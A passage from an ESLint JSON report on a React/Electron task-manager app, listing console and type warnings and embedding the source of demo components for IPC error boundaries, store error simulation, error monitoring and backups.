font-medium\">Results:</h4>\n          {results.map((result, index) => (\n            <div key={index} className=\"text-xs bg-muted p-2 rounded\">\n              Operation {index + 1}: {JSON.stringify(result)}\n            </div>\n          ))}\n        </div>\n      )}\n    </div>\n  );\n}\n\n/**\n * System capabilities dashboard\n */\nfunction SystemCapabilitiesExample() {\n  const [capabilities, setCapabilities] = useState<any>(null);\n  const [healthStatus, setHealthStatus] = useState<any>(null);\n  const ipcContext = useIPC();\n\n  useEffect(() => {\n    const loadCapabilities = async () => {\n      const [capResult, healthResult] = await Promise.all([\n        services.system.getCapabilities(),\n        services.system.performHealthCheck()\n      ]);\n\n      setCapabilities(capResult.data);\n      setHealthStatus(healthResult.data);\n    };\n\n    loadCapabilities();\n  }, []);\n\n  return (\n    <div className=\"bg-card p-4 rounded-lg border\">\n      <h3 className=\"font-semibold mb-3\">System Status</h3>\n      \n      <div className=\"grid grid-cols-2 gap-4 text-xs\">\n        <div>\n          <h4 className=\"font-medium mb-2\">IPC Status</h4>\n          <div className=\"space-y-1\">\n            <div>Available: {ipcContext.isAvailable ? 'âœ…' : 'âŒ'}</div>\n            <div>Healthy: {ipcContext.isHealthy ? 'âœ…' : 'âŒ'}</div>\n            <div>Errors: {ipcContext.errorCount}</div>\n            <div>Methods: {ipcContext.availableMethods.length}</div>\n          </div>\n        </div>\n\n        <div>\n          <h4 className=\"font-medium mb-2\">Capabilities</h4>\n          {capabilities && (\n            <div className=\"space-y-1\">\n              <div>File Access: {capabilities.hasFileAccess ? 'âœ…' : 'âŒ'}</div>\n              <div>Notifications: {capabilities.hasNotifications ? 'âœ…' : 'âŒ'}</div>\n              <div>Dialogs: {capabilities.hasDialogs ? 'âœ…' : 'âŒ'}</div>\n              <div>Platform: {capabilities.platform}</div>\n            </div>\n          )}\n        </div>\n      </div>\n\n      {healthStatus && (\n        <div className=\"mt-3 pt-3 border-t\">\n          <h4 className=\"font-medium mb-2 text-xs\">Health Check</h4>\n          <div className=\"text-xs space-y-1\">\n            <div>App Info: {healthStatus.appInfo ? 'âœ…' : 'âŒ'}</div>\n            <div>File System: {healthStatus.fileSystem ? 'âœ…' : 'âŒ'}</div>\n            <div>Dialogs: {healthStatus.dialogs ? 'âœ…' : 'âŒ'}</div>\n            <div>Last Check: {new Date(healthStatus.timestamp).toLocaleTimeString()}</div>\n          </div>\n        </div>\n      )}\n    </div>\n  );\n}\n\n/**\n * Main example component demonstrating the complete system\n */\nexport function IPCErrorBoundaryExample() {\n  return (\n    <IPCProvider\n      healthCheckInterval={30000}\n      autoStartMonitoring={true}\n      onConnectionLost={() => console.log('ðŸ”´ IPC Connection Lost')}\n      onConnectionRestored={() => console.log('ðŸŸ¢ IPC Connection Restored')}\n      onError={(error) => console.warn('IPC Error:', error)}\n    >\n      <div className=\"min-h-screen bg-background p-6\">\n        <div className=\"max-w-6xl mx-auto space-y-6\">\n          {/* Header with status notification */}\n          <div className=\"flex items-center justify-between\">\n            <h1 className=\"text-3xl font-bold\">IPC Error Boundary Example</h1>\n            <IPCStatusNotification \n              position=\"top-right\"\n              showCompactIndicator={true}\n            />\n          </div>\n\n          {/* Grid of examples */}\n          <div className=\"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6\">\n            <_AppInfoDisplayHOC />\n            <FileSystemExplorer />\n            <CriticalOperationExample />\n            <BatchOperationExample />\n            <div className=\"md:col-span-2 lg:col-span-1\">\n              <SystemCapabilitiesExample />\n            </div>\n          </div>\n\n          {/* Usage instructions */}\n          <div className=\"bg-muted/50 p-6 rounded-lg\">\n            <h2 className=\"font-semibold mb-3\">Usage Instructions</h2>\n            <div className=\"text-sm space-y-2\">\n              <p>1. <strong>HOC Pattern:</strong> Use `withIPCErrorHandling()` to wrap components that require IPC.</p>\n              <p>2. <strong>Hook Pattern:</strong> Use `useIPCErrorHandling()` for more granular control.</p>\n              <p>3. <strong>Service Layer:</strong> Use the `services` object for common operations with built-in error handling.</p>\n              <p>4. <strong>Critical Operations:</strong> Use `ipcCritical.invoke()` for operations that must succeed.</p>\n              <p>5. <strong>Status Monitoring:</strong> The notification component shows real-time IPC status.</p>\n            </div>\n          </div>\n        </div>\n      </div>\n    </IPCProvider>\n  );\n}\n\nexport default IPCErrorBoundaryExample;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/examples/StoreErrorHandlingExample.tsx","messages":[{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":37,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":37,"endColumn":20,"suggestions":[{"fix":{"range":[1344,1385],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":230,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":230,"endColumn":24,"suggestions":[{"fix":{"range":[8461,8503],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":246,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":246,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8873,8876],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8873,8876],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":256,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":256,"endColumn":22,"suggestions":[{"fix":{"range":[9245,9297],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":293,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":293,"endColumn":20,"suggestions":[{"fix":{"range":[10272,10326],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has a missing dependency: 'store'. Either include it or remove the dependency array.","line":384,"column":6,"nodeType":"ArrayExpression","endLine":384,"endColumn":8,"suggestions":[{"desc":"Update the dependencies array to be: [store]","fix":{"range":[13439,13441],"text":"[store]"}}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":405,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":405,"endColumn":22,"suggestions":[{"fix":{"range":[14010,14061],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":406,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":406,"endColumn":22,"suggestions":[{"fix":{"range":[14070,14101],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":407,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":407,"endColumn":22,"suggestions":[{"fix":{"range":[14110,14150],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":408,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":408,"endColumn":25,"suggestions":[{"fix":{"range":[14159,14178],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":10,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Complete Store Error Handling Integration Example (2025)\n * \n * This example demonstrates how to integrate the complete Zustand error handling\n * system including error boundaries, backup/recovery, and store wrappers.\n * \n * Following 2025 patterns for robust state management and error recovery.\n */\n\nimport { useState, useEffect } from 'react';\nimport { motion } from 'framer-motion';\nimport { AlertTriangle, Database, Shield, Activity, CheckCircle, Play, Download, Settings } from 'lucide-react';\n\n// Import our error handling system\nimport { StoreErrorBoundary } from '@/components/error/StoreErrorBoundary';\nimport { useErrorStore } from '@/store/errorStore';\nimport { backupService } from '@/store/backupService';\nimport { useErrorHandledTaskStore } from '@/store/storeErrorWrapper';\nimport type { } from '@/types';\n\n/**\n * Error simulation component for testing\n */\nfunction ErrorSimulator() {\n  const [isSimulating, setIsSimulating] = useState(false);\n  const errorStore = useErrorStore();\n\n  const simulateStoreError = async () => {\n    setIsSimulating(true);\n    try {\n      // Simulate various types of errors\n      await new Promise(resolve => setTimeout(resolve, 500));\n      \n      // This will be caught by the error wrapper\n      throw new Error('Simulated critical store operation failure');\n    } catch (error) {\n      console.error('Simulated error:', error);\n    } finally {\n      setIsSimulating(false);\n    }\n  };\n\n  const simulateNetworkError = () => {\n    errorStore.addError({\n      code: 'NETWORK_ERROR',\n      message: 'Simulated network connection failure',\n      context: { endpoint: '/api/tasks', method: 'GET' },\n      severity: 'high',\n      retryable: true,\n      operation: 'fetchTasks',\n      store: 'taskStore',\n      recovered: false,\n      reported: false\n    });\n  };\n\n  const simulateDataCorruption = () => {\n    errorStore.addError({\n      code: 'DATA_CORRUPTION',\n      message: 'Simulated data integrity check failure',\n      context: { corruptedFields: ['tasks', 'metadata'] },\n      severity: 'critical',\n      retryable: false,\n      operation: 'dataValidation',\n      store: 'taskStore',\n      recovered: false,\n      reported: false\n    });\n  };\n\n  const triggerComponentError = () => {\n    // This will be caught by the StoreErrorBoundary\n    throw new Error('Simulated React component error');\n  };\n\n  return (\n    <div className=\"bg-card border rounded-lg p-6\">\n      <h3 className=\"text-lg font-semibold mb-4 flex items-center gap-2\">\n        <Play className=\"w-5 h-5\" />\n        Error Simulation Controls\n      </h3>\n      \n      <div className=\"grid grid-cols-1 sm:grid-cols-2 gap-3\">\n        <button\n          onClick={simulateStoreError}\n          disabled={isSimulating}\n          className=\"flex items-center justify-center gap-2 px-4 py-2 bg-orange-600 text-white rounded hover:bg-orange-700 transition-colors disabled:opacity-50\"\n        >\n          <Database className=\"w-4 h-4\" />\n          {isSimulating ? 'Simulating...' : 'Store Error'}\n        </button>\n        \n        <button\n          onClick={simulateNetworkError}\n          className=\"flex items-center justify-center gap-2 px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700 transition-colors\"\n        >\n          <AlertTriangle className=\"w-4 h-4\" />\n          Network Error\n        </button>\n        \n        <button\n          onClick={simulateDataCorruption}\n          className=\"flex items-center justify-center gap-2 px-4 py-2 bg-purple-600 text-white rounded hover:bg-purple-700 transition-colors\"\n        >\n          <Shield className=\"w-4 h-4\" />\n          Data Corruption\n        </button>\n        \n        <button\n          onClick={triggerComponentError}\n          className=\"flex items-center justify-center gap-2 px-4 py-2 bg-pink-600 text-white rounded hover:bg-pink-700 transition-colors\"\n        >\n          <Activity className=\"w-4 h-4\" />\n          Component Error\n        </button>\n      </div>\n    </div>\n  );\n}\n\n/**\n * Error monitoring dashboard\n */\nfunction ErrorMonitoringDashboard() {\n  const errorStore = useErrorStore();\n  const [metrics, setMetrics] = useState(errorStore.metrics);\n  const [errors, setErrors] = useState(errorStore.errors);\n\n  useEffect(() => {\n    const unsubscribe = useErrorStore.subscribe((state) => {\n      setMetrics(state.metrics);\n      setErrors(state.errors);\n    });\n\n    return unsubscribe;\n  }, []);\n\n  const recentErrors = errors.slice(0, 5);\n\n  return (\n    <div className=\"bg-card border rounded-lg p-6\">\n      <h3 className=\"text-lg font-semibold mb-4 flex items-center gap-2\">\n        <Activity className=\"w-5 h-5\" />\n        Error Monitoring Dashboard\n      </h3>\n\n      {/* Metrics Grid */}\n      <div className=\"grid grid-cols-2 lg:grid-cols-4 gap-4 mb-6\">\n        <div className=\"bg-muted/50 rounded-lg p-3 text-center\">\n          <p className=\"text-2xl font-bold text-blue-600\">{metrics.totalErrors}</p>\n          <p className=\"text-sm text-muted-foreground\">Total Errors</p>\n        </div>\n        \n        <div className=\"bg-muted/50 rounded-lg p-3 text-center\">\n          <p className=\"text-2xl font-bold text-red-600\">{metrics.criticalErrorCount}</p>\n          <p className=\"text-sm text-muted-foreground\">Critical</p>\n        </div>\n        \n        <div className=\"bg-muted/50 rounded-lg p-3 text-center\">\n          <p className=\"text-2xl font-bold text-green-600\">{Math.round(metrics.recoverySuccessRate)}%</p>\n          <p className=\"text-sm text-muted-foreground\">Recovery Rate</p>\n        </div>\n        \n        <div className=\"bg-muted/50 rounded-lg p-3 text-center\">\n          <p className=\"text-2xl font-bold text-orange-600\">\n            {Object.keys(metrics.errorsByStore).length}\n          </p>\n          <p className=\"text-sm text-muted-foreground\">Affected Stores</p>\n        </div>\n      </div>\n\n      {/* Recent Errors */}\n      {recentErrors.length > 0 && (\n        <div>\n          <h4 className=\"font-medium mb-3\">Recent Errors</h4>\n          <div className=\"space-y-2 max-h-40 overflow-y-auto\">\n            {recentErrors.map((error) => (\n              <motion.div\n                key={error.id}\n                initial={{ opacity: 0, x: -20 }}\n                animate={{ opacity: 1, x: 0 }}\n                className={`p-3 rounded-lg border-l-4 ${\n                  error.severity === 'critical' ? 'border-red-500 bg-red-50 dark:bg-red-900/20' :\n                  error.severity === 'high' ? 'border-orange-500 bg-orange-50 dark:bg-orange-900/20' :\n                  error.severity === 'medium' ? 'border-yellow-500 bg-yellow-50 dark:bg-yellow-900/20' :\n                  'border-blue-500 bg-blue-50 dark:bg-blue-900/20'\n                }`}\n              >\n                <div className=\"flex items-center justify-between mb-1\">\n                  <span className=\"font-medium text-sm\">{error.operation}</span>\n                  <span className={`px-2 py-1 rounded text-xs font-medium ${\n                    error.severity === 'critical' ? 'bg-red-100 text-red-800' :\n                    error.severity === 'high' ? 'bg-orange-100 text-orange-800' :\n                    error.severity === 'medium' ? 'bg-yellow-100 text-yellow-800' :\n                    'bg-blue-100 text-blue-800'\n                  }`}>\n                    {error.severity}\n                  </span>\n                </div>\n                <p className=\"text-sm text-muted-foreground truncate\">{error.message}</p>\n                <div className=\"flex items-center justify-between mt-2\">\n                  <span className=\"text-xs text-muted-foreground\">\n                    {new Date(error.timestamp).toLocaleTimeString()}\n                  </span>\n                  {error.recovered && (\n                    <span className=\"flex items-center gap-1 text-xs text-green-600\">\n                      <CheckCircle className=\"w-3 h-3\" />\n                      Recovered\n                    </span>\n                  )}\n                </div>\n              </motion.div>\n            ))}\n          </div>\n        </div>\n      )}\n\n      {/* Action Buttons */}\n      <div className=\"flex gap-2 mt-4\">\n        <button\n          onClick={() => errorStore.clearAllErrors()}\n          className=\"flex items-center gap-1 px-3 py-1 bg-destructive text-destructive-foreground rounded text-sm hover:bg-destructive/90\"\n        >\n          Clear All\n        </button>\n        \n        <button\n          onClick={() => {\n            const data = errorStore.exportErrorData();\n            console.log('Exported error data:', data);\n          }}\n          className=\"flex items-center gap-1 px-3 py-1 bg-secondary text-secondary-foreground rounded text-sm hover:bg-secondary/90\"\n        >\n          <Download className=\"w-3 h-3\" />\n          Export\n        </button>\n      </div>\n    </div>\n  );\n}\n\n/**\n * Backup status panel\n */\nfunction BackupStatusPanel() {\n  const [backups, setBackups] = useState<any[]>([]);\n  const [backendStatus, setBackendStatus] = useState<Record<string, boolean>>({});\n\n  useEffect(() => {\n    const loadData = async () => {\n      try {\n        const availableBackups = await backupService.listBackups('taskStore');\n        setBackups(availableBackups);\n        setBackendStatus(backupService.getBackendStatus());\n      } catch (error) {\n        console.error('Failed to load backup data:', error);\n      }\n    };\n\n    loadData();\n    \n    // Refresh every 30 seconds\n    const interval = setInterval(loadData, 30000);\n    return () => clearInterval(interval);\n  }, []);\n\n  const createTestBackup = async () => {\n    try {\n      const testState = {\n        tasks: [\n          {\n            id: Date.now(),\n            title: `Test Backup ${new Date().toLocaleTimeString()}`,\n            description: 'Backup created for testing purposes',\n            status: 'pending',\n            priority: 'medium',\n            dependencies: [],\n            subtasks: [],\n            createdAt: new Date().toISOString(),\n            updatedAt: new Date().toISOString()\n          }\n        ],\n        selectedTask: null,\n        filters: {}\n      };\n\n      await backupService.createBackup('taskStore', testState);\n      \n      // Refresh backup list\n      const updatedBackups = await backupService.listBackups('taskStore');\n      setBackups(updatedBackups);\n    } catch (error) {\n      console.error('Failed to create test backup:', error);\n    }\n  };\n\n  return (\n    <div className=\"bg-card border rounded-lg p-6\">\n      <h3 className=\"text-lg font-semibold mb-4 flex items-center gap-2\">\n        <Database className=\"w-5 h-5\" />\n        Backup Status\n      </h3>\n\n      {/* Backend Status */}\n      <div className=\"mb-4\">\n        <h4 className=\"font-medium mb-2\">Storage Backends</h4>\n        <div className=\"flex gap-2\">\n          {Object.entries(backendStatus).map(([backend, available]) => (\n            <div key={backend} className=\"flex items-center gap-1\">\n              <div className={`w-2 h-2 rounded-full ${available ? 'bg-green-500' : 'bg-red-500'}`} />\n              <span className=\"text-sm capitalize\">{backend}</span>\n            </div>\n          ))}\n        </div>\n      </div>\n\n      {/* Backup List */}\n      <div className=\"mb-4\">\n        <div className=\"flex items-center justify-between mb-2\">\n          <h4 className=\"font-medium\">Available Backups ({backups.length})</h4>\n          <button\n            onClick={createTestBackup}\n            className=\"text-sm bg-primary text-primary-foreground px-2 py-1 rounded hover:bg-primary/90\"\n          >\n            Create Test Backup\n          </button>\n        </div>\n        \n        {backups.length === 0 ? (\n          <p className=\"text-sm text-muted-foreground\">No backups available</p>\n        ) : (\n          <div className=\"space-y-1 max-h-32 overflow-y-auto\">\n            {backups.slice(0, 5).map((backup) => (\n              <div key={backup.id} className=\"text-sm bg-muted/50 rounded p-2\">\n                <div className=\"flex items-center justify-between\">\n                  <span className=\"font-medium\">{backup.storeName}</span>\n                  <span className=\"text-muted-foreground\">v{backup.version}</span>\n                </div>\n                <p className=\"text-xs text-muted-foreground\">\n                  {new Date(backup.timestamp).toLocaleString()}\n                </p>\n              </div>\n            ))}\n          </div>\n        )}\n      </div>\n\n      {/* Configuration */}\n      <div>\n        <h4 className=\"font-medium mb-2\">Configuration</h4>\n        <div className=\"text-sm space-y-1\">\n          <div className=\"flex justify-between\">\n            <span>Auto-backup:</span>\n            <span className=\"text-green-600\">Enabled</span>\n          </div>\n          <div className=\"flex justify-between\">\n            <span>Max backups:</span>\n            <span>{backupService.getConfig().maxBackups}</span>\n          </div>\n          <div className=\"flex justify-between\">\n            <span>Interval:</span>\n            <span>{Math.round(backupService.getConfig().interval / 60000)}m</span>\n          </div>\n        </div>\n      </div>\n    </div>\n  );\n}\n\n/**\n * Main example component demonstrating the complete error handling system\n */\nexport function StoreErrorHandlingExample() {\n  const store = useErrorHandledTaskStore();\n  const [tasks, setTasks] = useState(store.getTasks());\n\n  useEffect(() => {\n    // Subscribe to store changes\n    const unsubscribe = store.subscribe(() => {\n      setTasks(store.getTasks());\n    });\n\n    return unsubscribe;\n  }, []);\n\n  const addSampleTask = () => {\n    store.addTask({\n      title: `Sample Task ${Date.now()}`,\n      description: 'This is a sample task created for testing',\n      status: 'pending',\n      priority: 'medium',\n      dependencies: [],\n      subtasks: [],\n      createdAt: new Date().toISOString(),\n      updatedAt: new Date().toISOString()\n    });\n  };\n\n  return (\n    <StoreErrorBoundary\n      enableAutoRecovery={true}\n      maxAutoRecoveryAttempts={3}\n      showDeveloperInfo={process.env.NODE_ENV === 'development'}\n      onError={(error, errorInfo) => {\n        console.group('ðŸ”´ Store Error Boundary Triggered');\n        console.error('Error:', error);\n        console.error('Error Info:', errorInfo);\n        console.groupEnd();\n      }}\n    >\n      <div className=\"min-h-screen bg-background p-6\">\n        <div className=\"max-w-6xl mx-auto space-y-6\">\n          {/* Header */}\n          <div className=\"text-center\">\n            <h1 className=\"text-3xl font-bold mb-2\">Store Error Handling Example</h1>\n            <p className=\"text-muted-foreground\">\n              Comprehensive demonstration of Zustand error handling, backup/recovery, and UI integration\n            </p>\n          </div>\n\n          {/* Current Tasks */}\n          <div className=\"bg-card border rounded-lg p-6\">\n            <div className=\"flex items-center justify-between mb-4\">\n              <h3 className=\"text-lg font-semibold\">Current Tasks ({tasks.length})</h3>\n              <button\n                onClick={addSampleTask}\n                className=\"bg-primary text-primary-foreground px-4 py-2 rounded hover:bg-primary/90\"\n              >\n                Add Sample Task\n              </button>\n            </div>\n            \n            {tasks.length === 0 ? (\n              <p className=\"text-center text-muted-foreground py-8\">\n                No tasks yet. Add a sample task to get started.\n              </p>\n            ) : (\n              <div className=\"space-y-2 max-h-40 overflow-y-auto\">\n                {tasks.slice(0, 5).map((task) => (\n                  <div key={task.id} className=\"p-3 bg-muted/50 rounded-lg\">\n                    <h4 className=\"font-medium\">{task.title}</h4>\n                    <p className=\"text-sm text-muted-foreground\">{task.description}</p>\n                    <div className=\"flex gap-2 mt-2\">\n                      <span className={`px-2 py-1 rounded text-xs ${\n                        task.status === 'done' ? 'bg-green-100 text-green-800' :\n                        task.status === 'in-progress' ? 'bg-blue-100 text-blue-800' :\n                        'bg-gray-100 text-gray-800'\n                      }`}>\n                        {task.status}\n                      </span>\n                      <span className={`px-2 py-1 rounded text-xs ${\n                        task.priority === 'high' ? 'bg-red-100 text-red-800' :\n                        task.priority === 'medium' ? 'bg-yellow-100 text-yellow-800' :\n                        'bg-green-100 text-green-800'\n                      }`}>\n                        {task.priority}\n                      </span>\n                    </div>\n                  </div>\n                ))}\n                {tasks.length > 5 && (\n                  <p className=\"text-center text-sm text-muted-foreground\">\n                    ...and {tasks.length - 5} more tasks\n                  </p>\n                )}\n              </div>\n            )}\n          </div>\n\n          {/* Error Simulation */}\n          <ErrorSimulator />\n\n          {/* Two-column layout for monitoring */}\n          <div className=\"grid grid-cols-1 lg:grid-cols-2 gap-6\">\n            <ErrorMonitoringDashboard />\n            <BackupStatusPanel />\n          </div>\n\n          {/* Usage Instructions */}\n          <div className=\"bg-muted/50 rounded-lg p-6\">\n            <h3 className=\"font-semibold mb-3 flex items-center gap-2\">\n              <Settings className=\"w-5 h-5\" />\n              Usage Instructions\n            </h3>\n            <div className=\"space-y-2 text-sm\">\n              <p><strong>1. Error Simulation:</strong> Click the error simulation buttons to test different error scenarios.</p>\n              <p><strong>2. Automatic Recovery:</strong> The system will automatically attempt recovery for retryable errors.</p>\n              <p><strong>3. Backup System:</strong> State is automatically backed up before critical operations.</p>\n              <p><strong>4. Monitoring:</strong> Real-time error tracking and metrics are displayed in the dashboard.</p>\n              <p><strong>5. Manual Recovery:</strong> If automatic recovery fails, use the error boundary UI for manual recovery.</p>\n            </div>\n          </div>\n\n          {/* Integration Status */}\n          <div className=\"bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-lg p-4\">\n            <div className=\"flex items-center gap-2 text-green-800 dark:text-green-200\">\n              <CheckCircle className=\"w-5 h-5\" />\n              <span className=\"font-medium\">Error Handling System Active</span>\n            </div>\n            <p className=\"text-sm text-green-700 dark:text-green-300 mt-1\">\n              All error handling components are properly integrated and operational.\n            </p>\n          </div>\n        </div>\n      </div>\n    </StoreErrorBoundary>\n  );\n}\n\nexport default StoreErrorHandlingExample;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/hooks/useAppState.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":24,"column":10,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":24,"endColumn":13,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[913,916],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[913,916],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":29,"column":14,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":29,"endColumn":17,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1009,1012],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1009,1012],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":34,"column":18,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":34,"endColumn":21,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1095,1098],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1095,1098],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":35,"column":15,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":35,"endColumn":18,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1114,1117],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1114,1117],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":36,"column":15,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":36,"endColumn":18,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1133,1136],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1133,1136],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":43,"column":25,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":43,"endColumn":28,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1263,1266],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1263,1266],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":63,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":63,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1645,1648],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1645,1648],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"The 'config' object makes the dependencies of useEffect Hook (at line 491) change on every render. To fix this, wrap the initialization of 'config' in its own useMemo() Hook.","line":94,"column":9,"nodeType":"VariableDeclarator","endLine":94,"endColumn":52},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":195,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":195,"endColumn":20,"suggestions":[{"fix":{"range":[5502,5557],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":199,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":199,"endColumn":20,"suggestions":[{"fix":{"range":[5608,5658],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":274,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":274,"endColumn":21,"suggestions":[{"fix":{"range":[7922,7981],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":287,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":287,"endColumn":21,"suggestions":[{"fix":{"range":[8431,8490],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":298,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":298,"endColumn":21,"suggestions":[{"fix":{"range":[8739,8791],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":310,"column":15,"nodeType":"MemberExpression","messageId":"unexpected","endLine":310,"endColumn":27,"suggestions":[{"fix":{"range":[9228,9296],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":315,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":315,"endColumn":21,"suggestions":[{"fix":{"range":[9367,9427],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":345,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":345,"endColumn":20,"suggestions":[{"fix":{"range":[10181,10235],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":349,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":349,"endColumn":20,"suggestions":[{"fix":{"range":[10286,10335],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the 